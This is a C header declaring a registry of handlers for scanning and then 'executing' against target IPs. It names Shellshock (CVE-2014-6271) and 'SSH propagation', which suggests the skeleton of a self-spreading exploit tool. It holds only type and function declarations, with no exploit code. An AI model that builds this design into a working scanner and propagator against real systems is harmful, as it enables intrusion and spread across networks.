#ifndef HANDLER_REGISTRY_H
#define HANDLER_REGISTRY_H

// CVE IDs
#define CVE_2014_6271 1
#define CVE_SSH_PROPAGATION 2
#define MAX_CVE_HANDLERS 10

typedef struct {
    int cve_id;
    int is_vulnerable;      // 0 or 1
    int confidence;         // 0-10
    int port_open;          // Port number or 0
    char service_type[32];  // Service type or empty
} cve_scan_result_t;

typedef struct {
    cve_scan_result_t results[MAX_CVE_HANDLERS];
    int count;
} cve_result_vector_t;

// Function pointer types for CVE handlers
typedef cve_scan_result_t (*scan_handler_func_t)(const char* target_ip);
typedef int (*execution_handler_func_t)(const char* target_ip);

typedef struct {
    int cve_id;
    scan_handler_func_t scan_func;      // C function pointer for scanning
    execution_handler_func_t exec_func; // C function pointer for execution
    int priority_order;
} cve_handler_config_t;

// Initialize handler registry
void init_handler_registry(void);

// Get handler by CVE ID
cve_handler_config_t* get_handler(int cve_id);

// Call scan handler (Phase 1)
cve_scan_result_t call_scan_handler(cve_handler_config_t* handler, const char* target_ip);

// Call execution handler (Phase 3)
int call_execution_handler(cve_handler_config_t* handler, const char* target_ip);

// Get all handlers for scanning
cve_result_vector_t scan_all_handlers(const char* target_ip);

#endif // HANDLER_REGISTRY_H

